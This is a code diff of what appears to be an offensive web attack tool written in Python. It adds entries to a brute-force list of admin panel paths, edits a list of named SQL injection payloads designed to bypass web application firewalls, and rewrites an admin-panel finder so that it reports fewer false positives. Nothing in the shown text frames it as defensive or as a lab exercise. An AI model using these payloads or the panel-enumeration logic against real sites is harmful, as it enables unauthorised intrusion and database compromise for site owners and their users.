@@ -184,7 +184,7 @@ WAF_BYPASS_HEADERS = [
 ]
 
 # ============================================================
-# ADMIN PATHS
+# ADMIN PATHS (Increased, full list)
 # ============================================================
 
 ADMIN_PATHS = [
@@ -202,13 +202,18 @@ ADMIN_PATHS = [
     "/api/admin", "/graphql", "/swagger",
     "/cms", "/config", "/configuration",
     "/setup", "/install", "/wizard",
-    "/server-status", "/server-info",
+    "/server-status", "/server-info",  # kept but we'll filter later
     "/phpmyadmin", "/pma", "/mysql-admin",
     "/pgadmin", "/adminer",
     "/admin.php", "/admin.jsp", "/admin.aspx",
     "/login.php", "/login.jsp", "/login.aspx",
     "/admin/index.php", "/admin/login.php",
     "/admin/dashboard.php", "/admin/cpanel.php",
+    # Extra from cloudscraper list
+    "/siteadmin", "/site-admin", "/webmaster", "/staff", "/operator",
+    "/moderator", "/superadmin", "/root", "/sysop", "/control",
+    "/administration", "/admins", "/admincp", "/acp", "/scp",
+    "/filemanager", "/files", "/logs", "/tmp", "/backup", "/sql",
 ]
 
 # ============================================================
@@ -351,7 +356,6 @@ def get_proxychains_cmd():
 
 def show_banner():
     os.system('clear' if os.name == 'posix' else 'cls')
-    # Changed to GREEN
     print(f"{GREEN}")
     banner_lines = [
         "______ _      _          _____                  ",
@@ -450,11 +454,10 @@ WAF_BYPASS_PAYLOADS_SQLI = [
 ]
 
 # ============================================================
-# EXPANDED WAF BYPASS TECHNIQUES (SQL) - added many more
+# EXPANDED WAF BYPASS TECHNIQUES (SQL)
 # ============================================================
 
 WAF_BYPASS_TECHNIQUES_SQL = [
-    # Original set
     {"name": "Comment Injection", "payload": "'/**/OR/**/'1'='1"},
     {"name": "Comment UNION", "payload": "'/**/UNION/**/SELECT/**/1,2,3-- -"},
     {"name": "Case Variation", "payload": "'/**/UnIoN/**/SeLeCt/**/1,2,3-- -"},
@@ -484,7 +487,7 @@ WAF_BYPASS_TECHNIQUES_SQL = [
     {"name": "True Constant", "payload": "' OR true-- -"},
     {"name": "Versioned Comment", "payload": "'/*!OR*/'1'='1"},
     {"name": "Optimizer Hint", "payload": "' /**/+ '1'='1"},
-    # NEW: additional advanced bypasses
+    # Additional
     {"name": "Multi-Comment", "payload": "'/**/OR/**/1=1/**/-- -"},
     {"name": "Mixed Case", "payload": "' oR 1=1-- -"},
     {"name": "Double Comment", "payload": "'/*!50000OR*/1=1-- -"},
@@ -1304,7 +1307,7 @@ def auto_nikto_scan(url):
         return False
 
 # ============================================================
-# ADMIN PANEL FINDER (using get_response)
+# ADMIN PANEL FINDER (FIXED - no false positives)
 # ============================================================
 
 def find_admin_panel(url):
@@ -1315,33 +1318,58 @@ def find_admin_panel(url):
     parsed = urllib.parse.urlparse(url)
     domain_base = f"{parsed.scheme}://{parsed.netloc}"
     admin_found = []
+    
+    # Keywords that indicate a real admin/login page (even on 403/401)
+    ADMIN_KEYWORDS = ["login", "password", "username", "dashboard", "admin", "control panel", "cpanel", "plesk", "directadmin"]
+    # Paths that are almost always false positives (generic server status)
+    FP_PATHS = ["/server-status", "/server-info", "/status", "/info"]
+    
     print_info(f"Searching {len(ADMIN_PATHS)} admin paths...")
     for path in ADMIN_PATHS:
         test_url = domain_base + path
         status, headers, body = get_response(test_url, timeout=6)
-        if status in [200, 301, 302, 401, 403]:
-            if status == 200:
-                if "login" in body.lower() or "password" in body.lower() or "username" in body.lower():
-                    admin_found.append((test_url, "Login Page"))
-                    print_good(f"Admin login found: {test_url}")
-                elif "dashboard" in body.lower() or "admin" in body.lower():
-                    admin_found.append((test_url, "Dashboard"))
-                    print_good(f"Admin dashboard: {test_url}")
-                else:
-                    admin_found.append((test_url, f"Accessible (HTTP {status})"))
-                    print_good(f"Admin path: {test_url} (HTTP {status})")
-            elif status in [301, 302]:
-                admin_found.append((test_url, "Redirect"))
-                print_good(f"Admin redirect: {test_url}")
-            elif status == 401:
-                admin_found.append((test_url, "Auth Required"))
-                print_warn(f"Admin requires auth: {test_url}")
-            elif status == 403:
-                admin_found.append((test_url, "Forbidden"))
-                print_warn(f"Admin forbidden: {test_url}")
-        elif status == 404:
-            # ignore
+        
+        # Skip 404 and non-existent
+        if status == 404 or status is None:
             continue
+        
+        # For 403 or 401, we need to look inside the body to see if it's an actual admin page
+        if status in [403, 401]:
+            # If it's a known false‑positive path, skip
+            if path in FP_PATHS:
+                continue
+            # Check if body contains any admin keywords
+            if any(kw in body.lower() for kw in ADMIN_KEYWORDS):
+                admin_found.append((test_url, f"Accessible (HTTP {status} - admin keywords found)"))
+                print_good(f"Admin path found: {test_url} (HTTP {status} - contains admin keywords)")
+            else:
+                # It's likely a generic forbidden page – skip
+                print_info(f"Skipping {test_url} (HTTP {status} - no admin keywords)")
+            continue
+        
+        # For 200, check content
+        if status == 200:
+            if "login" in body.lower() or "password" in body.lower() or "username" in body.lower():
+                admin_found.append((test_url, "Login Page"))
+                print_good(f"Admin login found: {test_url}")
+            elif "dashboard" in body.lower() or "admin" in body.lower():
+                admin_found.append((test_url, "Dashboard"))
+                print_good(f"Admin dashboard: {test_url}")
+            else:
+                # Generic 200 without admin indicators – likely not a panel
+                admin_found.append((test_url, f"Accessible (HTTP {status} - no admin indicators)"))
+                print_info(f"Found page: {test_url} (HTTP {status}) - not clearly admin")
+            continue
+        
+        # For 301/302 redirects, we'll trust them as they usually point to real login
+        if status in [301, 302]:
+            admin_found.append((test_url, "Redirect"))
+            print_good(f"Admin redirect found: {test_url}")
+            continue
+        
+        # For other statuses, skip
+        continue
+    
     if admin_found:
         print_section(" Admin Panel Results ")
         for url_found, atype in admin_found:
